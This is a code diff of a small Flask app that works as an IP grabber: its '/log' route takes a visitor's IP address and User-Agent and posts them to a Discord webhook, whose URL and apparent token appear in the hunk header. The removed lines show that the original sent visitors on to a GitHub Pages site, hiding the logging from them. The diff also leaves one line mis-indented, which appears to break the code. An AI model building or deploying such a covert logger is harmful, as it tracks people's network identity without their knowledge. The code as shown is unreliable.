@@ -12,7 +12,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0z
 
 @app.route("/log")
 def log_ip():
-    ip = (
+   ip = (
         request.headers.get("CF-Connecting-IP")
         or request.headers.get("True-Client-IP")
         or request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
@@ -25,8 +25,4 @@ def log_ip():
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     })
 
-    return redirect("https://gengaog.github.io/-/") 
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    return "ok"
